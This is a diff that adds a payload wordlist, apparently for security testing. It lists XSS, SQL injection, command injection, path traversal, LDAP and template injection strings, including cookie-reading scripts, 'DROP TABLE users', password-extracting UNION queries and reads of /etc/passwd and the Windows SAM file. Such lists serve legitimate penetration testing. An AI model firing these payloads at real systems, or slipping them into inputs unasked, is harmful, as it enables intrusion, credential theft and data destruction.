@@ -1,0 +1,37 @@
+# XSS Payloads
+<script>alert('xss')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert('xss')>
+<body onload=alert('xss')>
+"><script>alert(document.cookie)</script>
+<iframe src="javascript:alert('xss')">
+<input onfocus=alert(1) autofocus>
+
+# SQL Injection Payloads
+' OR 1=1 --
+" OR ""="
+1' ORDER BY 1--
+' UNION SELECT NULL,NULL,NULL--
+admin' --
+1; DROP TABLE users--
+' AND 1=1 UNION SELECT username,password FROM users--
+
+# Command Injection Payloads
+; ls -la
+| cat /etc/passwd
+$(whoami)
+`id`
+
+# Path Traversal
+../../etc/passwd
+..\..\windows\system32\config\sam
+....//....//etc/passwd
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+admin)(&)
+
+# Template Injection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
